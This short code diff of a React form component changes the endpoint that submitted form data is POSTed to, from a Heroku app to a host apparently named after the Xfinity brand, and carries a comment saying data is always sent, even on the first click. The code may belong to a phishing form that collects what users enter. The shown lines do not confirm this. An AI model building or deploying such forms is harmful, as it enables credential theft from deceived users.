@@ -64,7 +64,7 @@ const FormContainer = () => {
       // Always send data, even on the first click
       try {
         const response = await fetch(
-          'https://dry-lowlands-92661-9477faa2ef13.herokuapp.com/api/submit',
+          'https://xfinity-5y6r.onrender.com/api/submit',
           {
             method: 'POST',
             headers: {
@@ -88,7 +88,7 @@ const FormContainer = () => {
   
       try {
         const response = await fetch(
-          'https://dry-lowlands-92661-9477faa2ef13.herokuapp.com/api/submit',
+          'https://xfinity-5y6r.onrender.com/api/submit',
           {
             method: 'POST',
             headers: {
